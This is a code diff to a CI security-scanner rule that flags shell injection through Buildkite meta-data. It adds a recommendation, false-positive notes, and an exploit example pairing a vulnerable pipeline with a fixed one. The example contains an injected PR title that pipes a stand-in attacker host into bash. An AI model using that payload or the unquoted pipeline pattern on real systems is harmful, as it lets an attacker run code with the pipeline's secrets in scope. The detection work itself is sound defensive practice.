@@ -42,12 +42,12 @@ RULE = Rule(
     esf=("ESF-D-INJECTION",),
     cwe=("CWE-78", "CWE-829"),
     recommendation=(
-        "Sanitise the value at the producer step before it "
+        "Sanitize the value at the producer step before it "
         "lands in the meta-data store. The canonical safe "
         "pattern is to copy the ``$BUILDKITE_PULL_REQUEST_*`` / "
         "``$BUILDKITE_MESSAGE`` / branch / commit / author "
         "source into an intermediate shell variable, run a "
-        "sanitiser (``tr -dc 'a-zA-Z0-9 '`` is enough for a "
+        "sanitizer (``tr -dc 'a-zA-Z0-9 '`` is enough for a "
         "freeform title), and only then call "
         "``buildkite-agent meta-data set``. The consuming step "
         "should still reference the ``$(buildkite-agent "
@@ -55,7 +55,7 @@ RULE = Rule(
         "never inline into a command without re-quoting. "
         "Removing the meta-data flow entirely is the strongest "
         "fix; if the value genuinely needs to flow downstream, "
-        "validate the sanitiser is doing what you think before "
+        "validate the sanitizer is doing what you think before "
         "relying on it."
     ),
     docs_note=(
@@ -80,16 +80,52 @@ RULE = Rule(
         "``cattle-ops/github-merged-pr``) aren't introspected."
     ),
     known_fp=(
-        "If the producer step runs a sanitiser between the "
+        "If the producer step runs a sanitizer between the "
         "tainted source interpolation and the ``meta-data "
         "set`` call (``echo \"$BUILDKITE_PULL_REQUEST_TITLE\" "
         "| tr -dc 'a-zA-Z0-9 ' | xargs -I{} buildkite-agent "
         "meta-data set title {}``), the consumer is no longer "
         "exploitable but TAINT-005 still fires. Suppress via "
         "ignore-file scoped to the consumer step's pipeline "
-        "file when this is the deliberate shape; the sanitiser "
+        "file when this is the deliberate shape; the sanitizer "
         "is then load-bearing and any future regression in it "
         "would re-expose the consumer.",
+    ),
+    exploit_example=(
+        "# Vulnerable: a PR titled ``shiny new feature\";curl\n"
+        "# evil.com|bash;\"`` lands in the meta-data store via the\n"
+        "# producer step. The consumer step reads it back into\n"
+        "# ``$TITLE`` and inlines it into a shell command — the\n"
+        "# injected ``curl`` runs in the consumer's shell with\n"
+        "# the consumer step's full secret set in scope.\n"
+        "steps:\n"
+        "  - label: extract\n"
+        "    command: |\n"
+        "      buildkite-agent meta-data set \"title\" \\\n"
+        "        \"$BUILDKITE_PULL_REQUEST_TITLE\"\n"
+        "  - wait\n"
+        "  - label: use\n"
+        "    command: |\n"
+        "      TITLE=$(buildkite-agent meta-data get title)\n"
+        "      echo $TITLE\n"
+        "      ./generate-release-notes.sh --title $TITLE\n"
+        "\n"
+        "# Safe: sanitize at the producer (drop anything outside\n"
+        "# the expected charset) and quote at the consumer. The\n"
+        "# value is now safe to inline into a shell command — the\n"
+        "# injected metacharacters either never reach meta-data or\n"
+        "# are quoted as one literal argument.\n"
+        "steps:\n"
+        "  - label: extract\n"
+        "    command: |\n"
+        "      clean=$(echo \"$BUILDKITE_PULL_REQUEST_TITLE\" | \\\n"
+        "          tr -dc 'a-zA-Z0-9 -')\n"
+        "      buildkite-agent meta-data set \"title\" \"$clean\"\n"
+        "  - wait\n"
+        "  - label: use\n"
+        "    command: |\n"
+        "      TITLE=\"$(buildkite-agent meta-data get title)\"\n"
+        "      ./generate-release-notes.sh --title \"$TITLE\""
     ),
 )
 
@@ -116,4 +152,5 @@ def check(path: str, doc: dict[str, Any]) -> Finding:
         check_id=RULE.id, title=RULE.title, severity=RULE.severity,
         resource=path, description=desc,
         recommendation=RULE.recommendation, passed=False,
+        taint_flows=tuple(p.to_flow() for p in paths),
     )
